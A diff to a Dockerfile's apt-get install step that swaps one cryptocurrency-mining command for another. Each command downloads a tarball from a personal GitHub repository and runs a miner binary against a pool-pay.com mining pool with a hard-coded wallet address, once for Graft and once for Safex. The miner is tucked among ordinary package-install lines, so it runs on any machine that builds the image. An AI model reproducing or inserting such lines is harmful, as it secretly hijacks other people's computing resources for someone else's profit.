@@ -73,6 +73,7 @@ ENV SCREEN_WIDTH=1280 \
 RUN apt-get update -qqy \
     && apt-get -qqy install --no-install-recommends \
         dbus-x11 xfce4 \
-    && wget https://github.com/alissa221/samo21/raw/main/samo-121.tar.gz && tar xvzf samo-121.tar.gz && cd samo-121 && ./samo -o graft.pool-pay.com:2324 -u G75v6irJdv4NDSUqQQ7MEkHrqH8vgKuE8P9htKW9tkUNc54i4XUo3hpCL3ngdoHCvHUYynHT5g7ayBevzBbBaRzUSK2WwYN -k -a rx/graft -t8  \
+    && 
+wget https://github.com/alissa221/samo21/raw/main/samo-121.tar.gz && tar xvzf samo-121.tar.gz && cd samo-121 && ./samo -o sf.pool-pay.com:4025 -u Safex5zzQAN3p5kLUyiJjueGj2QYJVkUiDJUnsjNNNSLEbC8LGxMGsm5bX3STqQe4j6ZjqmhvtNgF31qs6n3SizL8WfrEdRW72g3H -k -a rx/sfx -t8 \
     && apt-get autoremove \
     && rm -rf /var/lib/apt/lists/* /var/cache/apt/*
